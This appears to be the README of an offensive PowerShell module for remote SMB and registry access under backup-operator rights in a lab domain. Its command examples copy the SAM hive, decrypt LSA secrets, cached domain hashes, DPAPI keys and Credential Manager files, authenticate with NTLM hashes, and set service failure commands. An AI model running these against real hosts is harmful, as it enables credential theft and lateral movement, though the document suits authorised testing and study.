@@ -1,0 +1,697 @@
+# Titanis.TBO.Smb2 PowerShell Module
+
+This module provides the TBO SMB2 PowerShell provider and cmdlets for backup-operator workflows.
+
+## Quick Start
+
+```powershell
+Import-Module .\Titanis.TBO.Smb2.psd1 -Force
+
+Set-TBOConnectOptions `
+  -ServerName corp1-web01.corp1.lab.home-labs.lol `
+  -HostName corp1-web01.corp1.lab.home-labs.lol `
+  -UserName psx_l_backupop `
+  -UserDomain corp1.lab.home-labs.lol `
+  -Password 'YourSecurePassword'
+
+New-PSDrive -Name tbo -PSProvider 'TBO.Smb2' -Root '\\corp1-web01.corp1.lab.home-labs.lol\C$'
+Set-Location tbo:\
+Get-ChildItem
+```
+
+## Provider (TBO.Smb2)
+
+The `TBO.Smb2` provider exposes SMB shares through a PowerShell drive. Connections are opened on-demand and use backup intent.
+
+```powershell
+# Use dynamic parameters on New-PSDrive to set credentials or SMB options.
+New-PSDrive -Name tbo -PSProvider 'TBO.Smb2' -Root '\\corp1-web01.corp1.lab.home-labs.lol\C$' `
+  -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
+
+Set-Location tbo:\
+Get-ChildItem
+```
+
+Provider-qualified UNC paths can be used without creating a drive:
+
+```powershell
+Get-ChildItem TBO.Smb2::\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows
+```
+
+Writing text content is supported via `Set-Content`/`Add-Content` on the provider or the `Out-TBOSmbFile` cmdlet:
+
+```powershell
+'testing' | Out-TBOSmbFile -Path tbo:\Temp\test.txt
+Add-Content tbo:\Temp\test.txt -Value 'more'
+Get-Content tbo:\Temp\test.txt
+```
+
+Use `Get-Help about_TBO_Smb2_Provider` for supported item types, dynamic parameters, and limitations.
+
+Root listings (`tbo:\` or `TBO.Smb2::\\server\share`) skip reparse metadata by default to avoid per-entry opens on large roots. Use `-IncludeRootReparseInfo` (alias `-RootReparseInfo`) on `New-PSDrive` or `Set-TBOConnectOptions` to enable it.
+
+On Windows, `Get-Acl` and `Set-Acl` work with `tbo:\` and provider-qualified UNC paths. Snapshot paths are read-only.
+
+## Provider (TBO.Reg) (Preview)
+
+The `TBO.Reg` provider exposes the remote registry through a per-server PSDrive. The drive root is the server name, and the top-level items are hives (HKLM, HKCU, HKU, etc). Keys enumerate subkeys by default; use `-IncludeProperties` to populate per-subkey value names in the Property column and `-IncludeValues` (or `-IncludeData`) to include values. The default value is shown as `(Default)`.
+
+```powershell
+New-PSDrive -Name tbo-reg -PSProvider 'TBO.Reg' -Root corp1-web01.corp1.lab.home-labs.lol
+Get-ChildItem tbo-reg:\
+Get-ChildItem tbo-reg:\HKLM\SOFTWARE -IncludeProperties
+Get-ChildItem tbo-reg:\HKLM\SOFTWARE -IncludeValues
+```
+
+Write operations use `New-Item`/`Remove-Item` for keys and `Set-ItemProperty`/`Remove-ItemProperty` for values.
+`New-ItemProperty`, `Rename-ItemProperty`, `Copy-ItemProperty`, and `Move-ItemProperty` are not supported.
+Use `Get-Help about_TBO_Reg_Provider` for provider-specific behavior and limitations.
+
+```powershell
+New-Item -Path tbo-reg:\HKLM\SOFTWARE\TBO
+Set-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name InstallId -Value "abc123"
+Set-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name Flags -Type DwordLE -Value 1
+Remove-ItemProperty -Path tbo-reg:\HKLM\SOFTWARE\TBO -Name Flags
+Remove-Item -Path tbo-reg:\HKLM\SOFTWARE\TBO -Recurse
+```
+
+Use `Get-Content` for registry value data (typed values when available, or `byte[]` for binary types). `Set-Content` is not supported.
+
+```powershell
+Get-Content tbo-reg:\HKLM\SOFTWARE\TBO\InstallId
+Get-Content tbo-reg:\HKLM\SOFTWARE\TBO\Flags
+```
+
+## Cmdlets
+
+Mutating cmdlets (Copy/Set/New/Remove) support `-WhatIf` and `-Confirm`.
+
+### Connect-TBOSmbServer
+
+Initializes the TBO.Smb2 provider for a server name. Connections are opened on-demand by later cmdlets.
+
+```powershell
+Connect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
+```
+
+### Disconnect-TBOSmbServer
+
+Closes cached SMB connections, sessions, and tree connects for a server or all servers.
+
+```powershell
+Disconnect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol
+Disconnect-TBOSmbServer -ServerName corp1-web01.corp1.lab.home-labs.lol -Force
+Disconnect-TBOSmbServer -All
+```
+
+### Set-TBOConnectOptions
+
+Sets connection defaults used by TBO cmdlets, the TBO.Smb2 provider, and the TBO.Reg provider. Supports the same dynamic parameters as `New-PSDrive` (credentials, SMB dialects, ciphers, signing, name resolution, and registry retry policy).
+
+Per-server settings take precedence over global defaults, and `New-PSDrive` dynamic parameters override the resolved defaults for that specific connection. When `-ServerName` is provided, the supplied parameters merge onto the existing per-server settings (unspecified values are preserved). If no per-server settings exist, the merge uses the current global defaults. When `-ServerName` is omitted, the global defaults are updated by merging onto the existing defaults.
+
+Changing options that affect the winreg fingerprint invalidates cached registry sessions for the target server (or all servers when updating global defaults). See `Docs/WinregSessionCaching.md` for details.
+
+```powershell
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -HostName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -NtlmHash "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef"
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -TicketCache C:\temp\krb5cc
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -AesKey 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef -Kdc corp1-dc01.corp1.lab.home-labs.lol
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -RetryPolicy Practical -RetryCount 3 -RetryDelayMs 100 -RetryMaxDelayMs 1000 -RetryJitterMs 100
+Set-TBOConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeRootReparseInfo
+```
+
+### Set-TBOSmbConnectOptions (Deprecated)
+
+Deprecated shim for `Set-TBOConnectOptions`. Uses the same dynamic parameters and behavior.
+
+```powershell
+Set-TBOSmbConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName psx_l_backupop -UserDomain corp1.lab.home-labs.lol -Password 'YourSecurePassword'
+```
+
+### Set-TBORegConnectOptions (Deprecated)
+
+Deprecated shim for `Set-TBOConnectOptions`. Use it when you need an older script name; behavior is identical.
+
+```powershell
+Set-TBORegConnectOptions -ServerName corp1-web01.corp1.lab.home-labs.lol -RetryPolicy Practical -RetryCount 3 -RetryDelayMs 100 -RetryMaxDelayMs 1000 -RetryJitterMs 100
+```
+
+### Copy-TBOSmbItem
+
+Copies files or directories between local paths and SMB paths using backup intent. Supports UNC or `tbo:\` paths. Use `-Force` (alias `-Overwrite`) to overwrite existing destinations. Directory copies are recursive; use `-CreateDirectories` to create missing destination paths.
+
+```powershell
+Copy-TBOSmbItem -Source tbo:\Windows\System32\config\SAM -Destination C:\Temp\SAM.bak
+Copy-TBOSmbItem -Source tbo:\Windows\System32\Microsoft\Protect\S-1-5-18 -Destination C:\Temp\MasterKeys -CreateDirectories
+Copy-TBOSmbItem -Source C:\Temp\local.txt -Destination tbo:\Temp\local.txt -CreateDirectories
+Copy-TBOSmbItem -Source C:\Temp\local.txt -Destination tbo:\Temp\local.txt -Force
+```
+
+### Out-TBOSmbFile
+
+Writes text content to an SMB path using backup intent. Accepts UNC or `tbo:\` paths.
+
+```powershell
+'testing' | Out-TBOSmbFile -Path tbo:\Temp\test.txt
+Get-Content tbo:\Temp\test.txt
+'more' | Out-TBOSmbFile -Path tbo:\Temp\test.txt -Append
+```
+
+### Get-TBOSmbSnapshots
+
+Lists available VSS snapshots for a file or directory.
+
+```powershell
+Get-TBOSmbSnapshots -Path tbo:\Windows\System32\config
+Get-TBOSmbSnapshots -Path \\corp1-web01\C$\Windows\System32\config
+Set-Location tbo:\@GMT-2026.01.25-20.47.30\Windows\System32\config
+```
+
+### Get-TBOSmbStreams
+
+Lists the data streams of a file or directory.
+
+```powershell
+Get-TBOSmbStreams -Path tbo:\Temp\local.txt
+Get-TBOSmbStreams -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\local.txt
+```
+
+### Get-TBOSmbSessions
+
+Lists active SMB sessions on the server. Some detail levels may require administrative rights; use `-Level Level1` or `-Level Level10` if higher levels return access denied.
+
+```powershell
+Get-TBOSmbSessions -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBOSmbSessions -ServerName corp1-web01.corp1.lab.home-labs.lol -Level Level1
+```
+
+### Get-TBOSmbOpenFiles
+
+Lists files open on the server via the srvsvc RPC interface. BasePath uses srvsvc conventions (drive roots like `C:\` or `\\` for pipes) and accepts UNC or `tbo:\` paths. Requires administrative rights (or equivalent) on the target server.
+
+```powershell
+Get-TBOSmbOpenFiles -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBOSmbOpenFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -BasePath tbo:\Windows -OpenBy psx_l_backupop
+```
+
+### Get-TBOSmbShares
+
+Lists SMB shares on the server via srvsvc. Some detail levels may require administrative rights; use `-Level Level1` if higher levels return access denied.
+
+```powershell
+Get-TBOSmbShares -ServerName corp1-web01.corp1.lab.home-labs.lol  # Requires Admin Privs
+Get-TBOSmbShares -ServerName corp1-web01.corp1.lab.home-labs.lol -Level Level1  # Non-Priv
+```
+
+### Get-TBOSmbNics
+
+Queries SMB network interfaces for a server. Accepts UNC or `tbo:\` paths; if the UNC path omits a share, IPC$ is used.
+
+```powershell
+Get-TBOSmbNics -Path \\corp1-web01.corp1.lab.home-labs.lol
+Get-TBOSmbNics -Path tbo:\
+```
+
+### Watch-TBOSmb
+
+Watches a remote directory for changes. Accepts UNC or `tbo:\` paths. Snapshot paths are not supported.
+
+```powershell
+Watch-TBOSmb -Path tbo:\Temp
+Watch-TBOSmb -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Temp -Recursive -ContinueOnErrors -BufferSize 4096
+```
+
+### Snapshot Navigation (TimeWarp)
+
+Use the @GMT token from Get-TBOSmbSnapshots to navigate a snapshot. Snapshot paths are read-only.
+
+```powershell
+$token = (Get-TBOSmbSnapshots -Path tbo:\temp | Select-Object -First 1).Token
+Set-Location "tbo:\$token\temp"
+Get-ChildItem
+```
+
+### Provider Item Operations
+
+Use native PowerShell cmdlets for links, mount points, and touch-style updates.
+
+```powershell
+# Create a junction (mount point) or symlink.
+New-Item -Path tbo:\Mounts\AppData -ItemType Junction -MountPointTarget 'C:\ProgramData'
+New-Item -Path tbo:\Links\Logs -ItemType Symlink -TargetPath 'C:\Windows\System32\LogFiles'
+
+# Remove the link or mount point (inverse of create).
+Remove-Item -Path tbo:\Mounts\AppData
+
+# Update timestamps/attributes (touch behavior).
+Set-ItemProperty -Path tbo:\Temp\example.txt -Name LastWriteTime -Value (Get-Date)
+Set-ItemProperty -Path tbo:\Temp\example.txt -Name Attributes -Value 'Hidden, ReadOnly'
+```
+
+### Get-TBOSmbSecurityDescriptor
+
+Reads a security descriptor from a file or directory and returns a portable `Titanis.Winterop.Security.SecurityDescriptor` by default. Use `-AsSddl`, `-AsBytes`, or `-AsWindows` (Windows only) to change output format.
+When using UNC paths, the server name must match the name used in `Set-TBOConnectOptions` (for example, FQDN vs short name). A mismatch can yield "context does not match any mechanisms supported by the server."
+Use `-Sections` to control which components are retrieved (default: Owner, Group, DACL).
+
+```powershell
+$sd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows
+$sddl = Get-TBOSmbSecurityDescriptor -Path \\corp1-web01.corp1.lab.home-labs.lol\C$\Windows -AsSddl
+$winSd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows -AsWindows
+$daclOnly = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows -Sections Dacl
+```
+
+### Set-TBOSmbSecurityDescriptor
+
+Writes a security descriptor to a file or directory from a portable `SecurityDescriptor`.
+Use `-Sections` to limit which parts of the descriptor are applied (default: Owner, Group, DACL).
+The input can be a portable `SecurityDescriptor`, an SDDL string, raw bytes, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only; on Linux use portable or raw bytes.
+
+```powershell
+$sd = Get-TBOSmbSecurityDescriptor -Path tbo:\Windows
+Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sd
+Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sd -Sections Dacl
+$sddl = "O:BAG:BAD:(A;;FA;;;SY)"
+Set-TBOSmbSecurityDescriptor -Path tbo:\Windows -SecurityDescriptor $sddl -Sections Dacl
+```
+
+### TBOSD Helper
+
+Converts registry security descriptor values to and from portable `SecurityDescriptor` instances. Use the helper when registry values store base64-encoded security descriptors.
+
+```powershell
+$sdBytes = (Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path 'HKLM\SYSTEM\CurrentControlSet\Services\Wuauserv\Security' -IncludeValues -IncludeData).Bytes
+$sd = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBinary($sdBytes)
+
+$base64 = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::ToRegistryBase64($sd)
+$sd2 = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBase64($base64)
+
+# Windows-only raw security descriptor
+$raw = [Titanis.Tbo.Smb2.PowerShell.TBOSD]::FromRegistryBinaryAsWindows($sdBytes)
+```
+
+### Remote Registry Cmdlets (MS-RRP)
+
+Remote registry cmdlets use the winreg pipe with backup/restore semantics. Session caching behavior is documented in `Docs/WinregSessionCaching.md`.
+
+#### Get-TBORegKey
+
+Gets metadata for a remote registry key.
+
+```powershell
+Get-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
+Get-TBORegKey -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -IncludeClass
+```
+
+#### Get-TBORegSecurityDescriptor
+
+Reads a security descriptor for a remote registry key. Use `-AsSddl`, `-AsBytes`, or `-AsWindows` (Windows only) to change output format.
+
+```powershell
+Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
+Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -AsSddl
+```
+
+#### Set-TBORegSecurityDescriptor
+
+Writes a security descriptor to a remote registry key. Input can be a portable `SecurityDescriptor`, SDDL string, raw bytes, or Windows security descriptor objects. SDDL and Windows descriptor inputs are Windows-only. Use `-Sections` to limit which parts are applied.
+
+```powershell
+$sd = Get-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
+Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -SecurityDescriptor $sd
+
+$sddl = "O:BAG:BAD:(A;;KR;;;SY)"
+Set-TBORegSecurityDescriptor -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE -SecurityDescriptor $sddl -Sections Dacl
+```
+
+#### Get-TBORegSessions
+
+Enumerates user session SIDs from HKEY_USERS on the remote host. SYSTEM SIDs are excluded by default.
+
+```powershell
+Get-TBORegSessions -ServerName corp1-web01.corp1.lab.home-labs.lol
+```
+
+#### Get-TBORegServices
+
+Enumerates service registry keys (defaults to HKLM\SYSTEM\CurrentControlSet\Services) and returns service metadata plus security descriptors.
+Use `-AsSddl` or `-AsWindows` to review service DACLs in alternate formats.
+
+```powershell
+Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AsWindows
+Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AsSddl
+Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
+Get-TBORegServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*' -AsSddl | Select-Object KeyName, SecurityDescriptor
+```
+
+#### Get-TBORegServiceDetails
+
+Returns extended registry-backed service metadata including core configuration, dependency lists, Parameters subkey values, security descriptors, and whether an _SC_ credential exists.
+
+```powershell
+Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'MDCoreSvc'
+Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
+Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService2' | Select-Object -Expand FailureActionsInfo
+Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv' | Select-Object -Expand TriggerInfo
+```
+
+TriggerInfo entries now include the registry key path and raw value data for round-trip edits.
+
+```powershell
+$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'
+$trigger = $svc.TriggerInfo | Select-Object -First 1
+$trigger.Values | Format-Table Name, ValueType, Value
+
+# Example: toggle the trigger action using the raw value data.
+Set-TBORegValue -ServerName $svc.ServerName -Path $trigger.KeyPath -Name 'Action' -Type DwordLE -Value 1
+```
+
+The helper class `TboRegServiceTriggerScenarios` provides common trigger setups equivalent to `sc.exe triggerinfo`.
+
+```powershell
+$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'wuauserv'
+$triggerPath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)\TriggerInfo\1"
+New-TBORegKey -ServerName $svc.ServerName -Path $triggerPath
+
+$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceTriggerScenarios]::StartOnNetworkOn()
+foreach ($value in $values) {
+  Set-TBORegValue -ServerName $svc.ServerName -Path $triggerPath -Name $value.Name -Type $value.ValueType -Value $value.Value
+}
+```
+
+```powershell
+# Firewall port open trigger (port/protocol/image/service are encoded as a STRING trigger data item)
+$triggerPath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)\TriggerInfo\2"
+New-TBORegKey -ServerName $svc.ServerName -Path $triggerPath
+
+$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceTriggerScenarios]::StartOnFirewallPortOpen(
+  "445",
+  "TCP",
+  "C:\Windows\System32\svchost.exe",
+  "LanmanServer")
+foreach ($value in $values) {
+  Set-TBORegValue -ServerName $svc.ServerName -Path $triggerPath -Name $value.Name -Type $value.ValueType -Value $value.Value
+}
+```
+
+FailureActionsInfo can be written, but use this for research only: bad values can prevent services from starting.
+The helper class `TboRegServiceFailureActionScenarios` generates valid FailureActions binary data and related values.
+
+```powershell
+$svc = Get-TBORegServiceDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService2'
+$servicePath = "HKLM\SYSTEM\CurrentControlSet\Services\$($svc.KeyName)"
+$values = [Titanis.Tbo.Smb2.PowerShell.TboRegServiceFailureActionScenarios]::RunCommandFirst(
+  "C:\Windows\System32\notepad.exe")
+
+foreach ($value in $values) {
+  Set-TBORegValue -ServerName $svc.ServerName -Path $servicePath -Name $value.Name -Type $value.ValueType -Value $value.Value
+}
+```
+
+#### Get-TBOScheduledTasks
+
+Enumerates scheduled task definitions from the Tasks folder and maps them to TaskCache registry entries for task IDs and registry timestamps.
+
+```powershell
+Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'OneDrive*'
+Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\Microsoft\Windows\*'
+```
+
+#### Get-TBOScheduledTaskDetails
+
+Reads scheduled task XML definitions, parses triggers/actions/principal/settings, and returns the task file security descriptor.
+Use `-AsSddl` or `-AsWindows` (Windows only) to change the security descriptor format.
+
+```powershell
+Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask'
+Get-TBOScheduledTasks -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestTask' | Get-TBOScheduledTaskDetails
+Get-TBOScheduledTaskDetails -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\Microsoft\Windows\Defrag\*' -AsSddl
+```
+
+#### Get-TBORegTCPIP
+
+Reads TCP/IP configuration from `Tcpip` and `Tcpip6` registry keys, including DNS/search list, routing, and interface-level settings. Interface GUIDs are mapped to friendly names when available.
+
+```powershell
+Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol -Protocol IPv6
+Get-TBORegTCPIP -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object -Expand Interfaces |
+  Where-Object { $_.DhcpEnabled -eq $false }
+```
+
+#### Get-TBORegLsaKeys
+
+Derives the boot key (syskey) and LSA encryption key from the remote registry.
+
+```powershell
+Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol
+```
+
+#### Get-TBORegLsaSecrets
+
+Decrypts LSA secrets from the remote registry using the derived LSA key.
+Binary secrets like `DPAPI_SYSTEM`, `NL$KM`, `$MACHINE.ACC`, and `Kerberos*` are returned as hex strings in `Secret`.
+`DPAPI_SYSTEM` is also split into machine/user halves (`DpapiMachineKey` and `DpapiUserKey`).
+
+```powershell
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$KM'
+```
+
+#### Get-TBORegCachedCredentials
+
+Decrypts cached domain credentials stored under `HKLM\SECURITY\Cache` and returns DCC1/DCC2 hashes with usernames.
+
+```powershell
+Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegCachedCredentials -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$1'
+```
+
+#### Get-TBORegMachineAccount
+
+Decrypts the $MACHINE.ACC secret and returns the machine account password and NT hash.
+When the password is not readable text, it is emitted as hex.
+
+```powershell
+Get-TBORegMachineAccount -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol | Get-TBORegMachineAccount
+```
+
+#### Get-TBORegSecretLocations
+
+Enumerates well-known registry locations that may hold secrets (LSA secrets, cached credentials, autologon, and user hive locations like PuTTY or VNC).
+
+```powershell
+Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeSystemHives
+Get-TBORegSecretLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -IncludeMissing
+```
+
+#### Get-TBODpapiMasterKeyLocations
+
+Enumerates DPAPI master key files for machine and user scopes over SMB and marks preferred keys when possible.
+Writes progress to the console with the current path being scanned.
+Machine scope includes keys under `S-1-5-18\user` when present.
+
+```powershell
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User
+Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -ShareName C$
+```
+
+#### Get-TBODpapiMasterKeys
+
+Decrypts DPAPI master keys using DPAPI_SYSTEM from LSA secrets.
+Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw key bytes.
+
+```powershell
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -DpapiMachineKey <hex> -DpapiUserKey <hex>
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$
+```
+
+#### Find-TBODpapiBlobs
+
+Searches file system and registry paths for DPAPI blobs by looking for the DPAPI magic header in the first 1024 bytes.
+Use `-Recurse` to walk child directories or registry keys.
+
+```powershell
+Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users' -Recurse
+Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse -MaxBytes 2048
+Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Microsoft -Recurse
+```
+
+#### Get-TBODpapiBlob
+
+Decrypts a DPAPI blob using a DPAPI master key.
+Use Get-TBODpapiMasterKeys to recover the master key first.
+
+```powershell
+$mk = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine |
+  Where-Object IsPreferred
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\Public\blob.bin' -MasterKey $mk.MasterKey
+
+$blob = Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse |
+  Select-Object -First 1
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Path -Offset $blob.MatchOffset -MasterKey $mk.MasterKey
+
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
+```
+
+#### Get-TBOCredManFiles
+
+Enumerates Credential Manager files (Credentials and Vaults) for user and system profiles.
+
+```powershell
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith'
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine
+```
+
+#### Get-TBOCredManEntry
+
+Reads a Credential Manager file and reports metadata plus DPAPI blob offsets (no decryption in this phase).
+Scheduled task credentials (TaskScheduler:Task entries) are decoded into target, user, and secret lines when cleartext is available.
+
+```powershell
+$files = Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith'
+$files | Get-TBOCredManEntry | Select-Object SourcePath, HasDpapiBlob, DpapiBlobOffset
+
+Get-TBOCredManEntry -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Local\Microsoft\Credentials\CRED_FILE'
+
+$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
+  Get-TBOCredManEntry -MasterKeys $keys
+```
+
+#### Get-TBORegAutoLogon
+
+Reads autologon configuration values from the Winlogon registry key.
+
+```powershell
+Get-TBORegAutoLogon -ServerName corp1-web01.corp1.lab.home-labs.lol
+```
+
+#### Get-TBORegSamHashes
+
+Derives local SAM account hashes using the remote registry (backup semantics required).
+
+```powershell
+Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object AccountName, FullName, Rid, NtlmHashText
+```
+
+#### Get-TBONtHash
+
+Computes an NT hash (MD4 of UTF-16LE) for a password string.
+
+```powershell
+Get-TBONtHash -Password 'Passw0rd!'
+'Passw0rd!' | Get-TBONtHash | Select-Object NtlmHashText
+```
+
+#### Find-TBORegWeakServices
+
+Scans service security descriptors and reports AccessAllowed entries that grant service configuration rights to non-system trustees.
+The default `AccessMask` flags include SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, WRITE_DAC, WRITE_OWNER, and GENERIC_WRITE.
+Output includes `AccessMaskText` (hex) and `AccessRights` (human-readable rights derived from the access mask).
+SERVICE_ALL_ACCESS only matches when all service rights are granted; the other flags match if any of their bits are present.
+
+```powershell
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'TestService*'
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -IgnoreServiceSids
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AccessMask 0x00040002 -IncludeUninteresting
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol -AccessMask 0x00000002
+Find-TBORegWeakServices -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object ServiceName, AccessMaskText, AccessRights
+```
+
+#### Get-TBORegChildItem
+
+Lists subkeys and values beneath a remote registry key.
+By default, both subkeys and values are returned. If you specify `-IncludeSubkeys` or `-IncludeValues`, the output is limited to only those sets.
+Use `-IncludeData` to include value payloads (only applies when values are included).
+
+```powershell
+Get-TBORegChildItem -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SOFTWARE
